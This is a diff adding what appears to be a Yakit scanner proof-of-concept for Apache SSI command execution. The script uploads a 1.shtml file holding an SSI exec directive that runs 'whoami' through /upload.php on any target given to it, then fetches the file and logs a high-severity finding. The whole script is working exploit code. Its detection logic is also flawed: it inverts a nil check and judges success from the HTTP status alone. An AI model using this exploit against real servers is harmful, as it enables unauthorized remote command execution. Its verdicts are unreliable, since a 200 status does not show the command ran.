@@ -1,0 +1,129 @@
+yakit.AutoInitYakit()
+log.setLevel("info")
+
+isHttps = cli.Have("https", cli.setDefault(false))
+target = cli.String("target")
+
+if str.IsHttpURL(target) == true {
+    yakit.Error("Please input without http:// or https://")
+    return
+}
+
+packet = `
+POST /upload.php HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Content-Length: 220
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykk45MxCYMQxZVOuL
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+
+------WebKitFormBoundarykk45MxCYMQxZVOuL
+Content-Disposition: form-data; name="file_upload"; filename="1.shtml"
+Content-Type: application/octet-stream
+
+<!--#exec cmd="whoami" -->
+------WebKitFormBoundarykk45MxCYMQxZVOuL--`
+
+debug = cli.Have("debug", cli.setDefault(false))
+
+if debug {
+    loglevel("debug")
+}
+
+sendPacket = func(target) {
+    return poc.HTTP(
+        packet, 
+        poc.timeout(10),
+        # poc.proxy("http://127.0.0.1:8083"),
+        # poc.proxy("http://127.0.0.1:7890"),
+        poc.redirectTimes(3),  # 重定向次数
+        poc.https(isHttps),
+        poc.params({
+            "target": target,
+        },
+    ))
+}
+
+checkpacket = `
+GET /1.shtml HTTP/1.1
+Host: {{params(target)}}
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+
+`
+
+checkPacket = func(target) {
+    return poc.HTTP(
+        checkpacket, 
+        poc.timeout(10),
+        # poc.proxy("http://127.0.0.1:8083"),
+        # poc.proxy("http://127.0.0.1:7890"),
+        poc.redirectTimes(3),  # 重定向次数
+        poc.https(isHttps),
+        poc.params({
+            "target": target,
+        },
+    ))
+}
+
+
+if YAK_MAIN {
+    rspBytes, reqBytes, err = sendPacket(target)
+    if err != nil {
+        yakit.Error(string(err))
+        return
+    }
+    sleep(2)
+    rspcheckBytes, reqcheckBytes, checkerr = checkPacket(target)
+    if checkerr != nil {
+        yakit.Error(string(checkerr))
+        return
+    }
+
+    if debug {
+        println(string(reqBytes))
+        println("---------------------------------")
+        println(string(rspBytes))
+        println("#################################")
+        println(string(reqcheckBytes))
+        println("---------------------------------")
+        println(string(rspcheckBytes))
+    }
+
+    riskTarget = target
+    httprsp, httperr = str.ParseBytesToHTTPResponse(rspcheckBytes)
+    if httperr != nil {
+        yakit.Error(string(httperr))
+        return
+    }
+
+    if httprsp.StatusCode == 200 {
+        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(reqBytes, isHttps)
+        if urlIns == nil {
+            riskTarget = urlIns.String()
+        }
+        yakit.Info("Found Apache SSI 远程命令执行漏洞")
+        log.info("Found Apache SSI 远程命令执行漏洞")
+        # Save to RiskTable
+        risk.NewRisk(
+            riskTarget, risk.severity("high"), risk.type("poc"),
+            risk.title("Apache SSI RCE"),            ## English Title for Risk
+            risk.titleVerbose("Apache SSI 远程命令执行漏洞"),           ##  中文标题
+            risk.details({
+                "target": riskTarget,
+                "request": reqBytes,
+                "response": rspBytes,
+            }),
+        )
+    }else {
+        yakit.Info("Not Found Apache SSI 远程命令执行漏洞")
+        log.info("Not Found Apache SSI 远程命令执行漏洞")
+    }
+}
